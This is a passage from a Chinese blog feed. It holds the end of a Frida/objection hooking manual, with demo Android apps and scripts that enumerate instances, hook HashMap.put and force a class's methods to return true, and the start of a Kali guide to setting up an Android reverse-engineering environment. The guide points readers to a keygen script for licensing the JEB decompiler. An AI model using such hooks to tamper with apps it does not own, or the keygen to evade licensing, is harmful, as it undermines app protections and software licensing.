android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        milk.main();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/3.3.1.png" class=""><p>用js实现<code>milk.java</code>中的内容：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test02.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> beer = <span class="title class_">Java</span>.<span class="title function_">registerClass</span>(&#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;com.v5le0n9.test02.beer&#x27;</span>,</span><br><span class="line">            <span class="attr">implements</span>: [<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.v5le0n9.test02.liquid&#x27;</span>)],</span><br><span class="line">            <span class="attr">methods</span>:&#123;</span><br><span class="line">                <span class="attr">flow</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;look I&#x27;m beer!&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;taste good!&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)    </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;beer.flow:&quot;</span>,beer.$new().<span class="title function_">flow</span>())</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">setTimeout</span>(main,<span class="number">2000</span>)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/3.3.2.png" class=""><h2 id="3-4-枚举"><a href="#3-4-枚举" class="headerlink" title="3.4 枚举"></a>3.4 枚举</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//TrafficLight.java</span></span><br><span class="line"><span class="keyword">package</span> com.v5le0n9.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Signal</span>&#123;</span><br><span class="line">    GREEN,YELLOW,RED</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrafficLight</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">Signal</span> <span class="variable">color</span> <span class="operator">=</span> Signal.RED;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//Log.d(&quot;4enum&quot;,&quot;enum&quot; + color.getClass().getName().toString());</span></span><br><span class="line">        Log.d(<span class="string">&quot;4enum&quot;</span>,<span class="string">&quot;enum&quot;</span> + color);</span><br><span class="line">        <span class="keyword">switch</span>(color)&#123;</span><br><span class="line">            <span class="keyword">case</span> RED:</span><br><span class="line">                color = Signal.GREEN;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> YELLOW:</span><br><span class="line">                color = Signal.RED;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> GREEN:</span><br><span class="line">                color = Signal.YELLOW;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MainActivity.java</span></span><br><span class="line"><span class="keyword">package</span> com.v5le0n9.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        TrafficLight.main();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/3.4.1.png" class=""><p>枚举可以看作一个类，可以使用js代码方式使用枚举的方法，比如将枚举的值列出用<code>getDeclaringClass()</code>方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test02.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.v5le0n9.test02.Signal&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance:&quot;</span>,instance)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;invoke getDeclaringClass:&quot;</span>,instance.<span class="title function_">getDeclaringClass</span>())</span><br><span class="line">            &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Serach completed!&quot;</span>)&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">setTimeout</span>(main,<span class="number">2000</span>)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/3.4.2.png" class=""><p>当一个类中需要hook的方法较多，则可以使用枚举：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> class_name = <span class="string">&quot;com.example.androiddemo.Activity.FridaActivity4$InnerClasses&quot;</span></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">InnerClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(class_name)</span><br><span class="line">        <span class="keyword">var</span> all_methods = <span class="title class_">InnerClass</span>.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>()</span><br><span class="line">        <span class="comment">//console.log(all_methods)</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;all_methods.<span class="property">length</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">var</span> method = all_methods[i]</span><br><span class="line">            <span class="comment">//console.log(method.toString())</span></span><br><span class="line">            <span class="keyword">var</span> subString = method.<span class="title function_">toString</span>().<span class="title function_">substr</span>(method.<span class="title function_">toString</span>().<span class="title function_">indexOf</span>(class_name)+class_name.<span class="property">length</span>+<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">var</span> finalMethodString = substring.<span class="title function_">substr</span>(<span class="number">0</span>,substring.<span class="title function_">indexOf</span>(<span class="string">&quot;(&quot;</span>))</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(finalMethodString)</span><br><span class="line">            <span class="title class_">InnerClass</span>[finalMethodString].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">return</span> <span class="literal">true</span>&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-5-Map"><a href="#3-5-Map" class="headerlink" title="3.5 Map"></a>3.5 Map</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MainActivity.java</span></span><br><span class="line"><span class="keyword">package</span> com.v5le0n9.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        Map&lt;String,String&gt; mapv5le0n9 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        mapv5le0n9.put(<span class="string">&quot;ISBN 978-7-5677-8742-1&quot;</span>,<span class="string">&quot;Android项目开发实战入门&quot;</span>);</span><br><span class="line">        mapv5le0n9.put(<span class="string">&quot;ISBN 978-7-5677-8741-4&quot;</span>,<span class="string">&quot;C语言项目开发实战入门&quot;</span>);</span><br><span class="line">        mapv5le0n9.put(<span class="string">&quot;ISBN 978-7-5677-9897-1&quot;</span>,<span class="string">&quot;PHP项目开发实战入门&quot;</span>);</span><br><span class="line">        mapv5le0n9.put(<span class="string">&quot;ISBN 978-7-5677-8748-7&quot;</span>,<span class="string">&quot;Java项目开发实战入门&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Set&lt;String&gt; set = mapv5le0n9.keySet();</span><br><span class="line">        Iterator&lt;String&gt; it = set.iterator();</span><br><span class="line">        Log.d(<span class="string">&quot;5map&quot;</span>,<span class="string">&quot;key:&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(it.hasNext())&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">                Log.d(<span class="string">&quot;5map&quot;</span>,it.next()+<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Log.d(<span class="string">&quot;5map&quot;</span>,<span class="string">&quot;key toString&quot;</span> + mapv5le0n9.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/3.5.1.png" class=""><p>使用js代码查看Map的<code>toString()</code>方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test02.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hashmap888</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;java.util.HashMap&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(instance.<span class="title function_">toString</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;ISBN&quot;</span>)!=-<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found HashMap&quot;</span>,instance)</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;HashMap toString&quot;</span>, instance.<span class="title function_">toString</span>())</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Search Completed!&quot;</span>)&#125;</span><br><span class="line">        </span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">setTimeout</span>(hashmap888,<span class="number">2000</span>)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/3.5.2.png" class=""><p>尝试hook Map的<code>put()</code>方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test02.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hashmap888</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.util.HashMap&quot;</span>).<span class="property">put</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1, args2</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">put</span>(args1, args2)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1, args2, result&quot;</span>, args1, args2, result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hashmap888)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/3.5.3.png" class=""><h1 id="4-一些查漏补缺"><a href="#4-一些查漏补缺" class="headerlink" title="4. 一些查漏补缺"></a>4. 一些查漏补缺</h1><p>通过hook或者算法得出来的结果不能复制到Android设备的文本框中，可以使用adb传入结果。点击需要填入结果的文本框，通过以下命令传到文本框中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br><span class="line">input text &lt;结果&gt;</span><br></pre></td></tr></table></figure><p>用js修改静态成员变量：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;&lt;包名+类名&gt;&quot;</span>).&lt;静态成员变量&gt;.<span class="property">value</span> = &lt;想要修改的值&gt;</span><br></pre></td></tr></table></figure><p>用js修改动态成员变量：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;&lt;包名+类名&gt;&quot;</span>,&#123;</span><br><span class="line">    <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance&quot;</span>, instance)</span><br><span class="line">        instance.&lt;动态成员变量&gt;.<span class="property">value</span> = &lt;想要修改的值&gt;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//如果遇到与变量同名的方法，标识变量只需在开头添加下划线即可</span></span><br><span class="line">        instance.<span class="property">_</span>&lt;动态成员变量&gt;.<span class="property">value</span> = &lt;想要修改的值&gt;</span><br><span class="line">    &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇文章记录一下objection和frida的使用方法，相当于操作手册。&lt;/p&gt;</summary>
    
    
    
    <category term="Android逆向" scheme="http://example.com/categories/Android%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>Kali搭建Android逆向环境</title>
    <link href="http://example.com/posts/fb170550.html"/>
    <id>http://example.com/posts/fb170550.html</id>
    <published>2022-08-13T08:08:26.960Z</published>
    <updated>2022-08-16T13:07:03.282Z</updated>
    
    <content type="html"><![CDATA[<p>每次都要找教程太累人了，自己写一个记录。</p><span id="more"></span><h1 id="1-基础配置"><a href="#1-基础配置" class="headerlink" title="1. 基础配置"></a>1. 基础配置</h1><p>去Kali官网下载最新版的<a href="https://www.kali.org/get-kali/#kali-virtual-machines">Kali虚拟机</a>，解压后放入VMware即可，将内存和处理器往高调。默认账户kali，密码kali。</p><p>将Kali调成永不熄屏。</p><img src="/posts/fb170550/1.1.1.png" class=""><img src="/posts/fb170550/1.1.2.png" class=""><p>修改账户root的密码为toor，重启，使用root用户登录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><p>如果Kali里的时间不正确，修改为正确时间：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg-reconfigure tzdata</span><br></pre></td></tr></table></figure><p>选择Asia -&gt; Shanghai。</p><p>检查与更新软件包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt upgrade</span><br></pre></td></tr></table></figure><p>如果在Kali中中文显示乱码，安装中文依赖包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install xfonts-intl-chinese</span><br><span class="line">apt install ttf-wqy-microhei</span><br></pre></td></tr></table></figure><p>将zsh回退到bash，修改完重启Kali：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chsh -s /bin/bash</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><p>增加HISTSIZE，可以保存更多的命令历史：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim .bashrc</span><br></pre></td></tr></table></figure><p>将HISTSIZE和HISTFILESIZE设置大一点：</p><img src="/posts/fb170550/1.1.3.png" class=""><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source .bashrc</span><br></pre></td></tr></table></figure><p>如果有科学上网，可以设置代理，没有可以不弄：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure><img src="/posts/fb170550/1.1.4.png" class=""><p>注释掉proxy_dns和socks4，增加socks5 [连接虚拟机网卡的主机IP] [端口]。</p><img src="/posts/fb170550/1.1.5.png" class=""><img src="/posts/fb170550/1.1.6.png" class=""><h1 id="2-实用工具"><a href="#2-实用工具" class="headerlink" title="2. 实用工具"></a>2. 实用工具</h1><p>安装htop，用来动态查看当前活跃的、占用高的进程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install htop</span><br></pre></td></tr></table></figure><p>安装jnettop，流量查看工具，可以查看下载和安装速度：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install jnettop</span><br></pre></td></tr></table></figure><p>安装<a href="https://www.sweetscape.com/download/010editor/">010 Editor</a>，查看文件格式工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.sweetscape.com/download/010EditorLinux64Installer.tar.gz</span><br><span class="line">tar zxvf 010EditorLinux64Installer.tar.gz</span><br><span class="line">./010EditorLinux64Installer</span><br></pre></td></tr></table></figure><p>安装<a href="https://code.visualstudio.com/">VSCode</a>，下载<code>.deb</code>包，解压：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install dpkg</span><br><span class="line">dpkg -i code_1.70.1-1660113095_amd64.deb</span><br></pre></td></tr></table></figure><p>VSCode在root用户打不开，可在快捷方式右键 -&gt; Edit Application，在Command中修改为以下命令即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/code/code --no-sandbox --unity-launch %F</span><br></pre></td></tr></table></figure><h1 id="3-安卓逆向必备工具"><a href="#3-安卓逆向必备工具" class="headerlink" title="3. 安卓逆向必备工具"></a>3. 安卓逆向必备工具</h1><p>去<a href="https://developer.android.google.cn/studio">Android Studio官网</a>下载安装Android Studio：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://redirector.gvt1.com/edgedl/android/studio/ide-zips/2021.2.1.16/android-studio-2021.2.1.16-linux.tar.gz</span><br><span class="line">tar zxvf android-studio-2021.2.1.16-linux.tar.gz</span><br><span class="line">cd android-studio/bin</span><br><span class="line">./studio.sh</span><br></pre></td></tr></table></figure><p>运行AS让它下载SDK，创建一个Empty Avtivity让它下载并初始化一下安卓开发环境。</p><p>安装反编译工具<a href="https://github.com/skylot/jadx">jadx</a>，下载最新版：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/skylot/jadx/releases/download/v1.4.3/jadx-1.4.3.zip</span><br><span class="line">7z x jadx-1.4.3.zip</span><br><span class="line">cd bin</span><br><span class="line">./jadx-gui</span><br></pre></td></tr></table></figure><p>将其加入系统路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bashrc</span><br></pre></td></tr></table></figure><p>在文件末尾添加一条路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PATH=$PATH:/root/jadx-1.4.3/bin;export PATH;</span><br></pre></td></tr></table></figure><p>保存后source一下，就可以在任意路径中使用jadx了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">source ~/.bashrc</span><br><span class="line">jadx-gui</span><br></pre></td></tr></table></figure><p>下载反编译工具<a href="https://down.52pojie.cn/Tools/Android_Tools/JEB_demo_4.16.0.202205110304_JEBDecompiler_121820464987384330.zip">jeb</a>到主机，拖进Kali，解压，运行jeb让它初始化：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">7z x JEB-4.16.0.zip</span><br><span class="line">cd JEB-4.16.0</span><br><span class="line">7z x jeb-demo-4.16.0.zip</span><br><span class="line">cd jeb-demo-4.16.0</span><br><span class="line">./jeb_linux.sh</span><br></pre></td></tr></table></figure><p>打开写入Key name后，点击Manual Key Generation，复制License data。运行<code>jebKengen.py</code>，输入License data后会输出License key，回填即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 jebKeygen.py</span><br></pre></td></tr></table></figure><p>安装scrcpy，远程桌面，可以将手机界面投屏到电脑上查看实时情况：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt search scrcpy</span><br><span class="line">apt install scrcpy</span><br></pre></td></tr></table></figure><h1 id="4-Frida版本管理和开发环境"><a href="#4-Frida版本管理和开发环境" class="headerlink" title="4. Frida版本管理和开发环境"></a>4. Frida版本管理和开发环境</h1><p>安装pyenv，设置多版本Python环境：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pyenv/pyenv.git ~/.pyenv</span><br><span class="line">echo &#x27;export PYENV_ROOT=&quot;$HOME/.pyenv&quot;&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line">echo &#x27;command -v pyenv &gt;/dev/null || export PATH=&quot;$PYENV_ROOT/bin:$PATH&quot;&#x27; 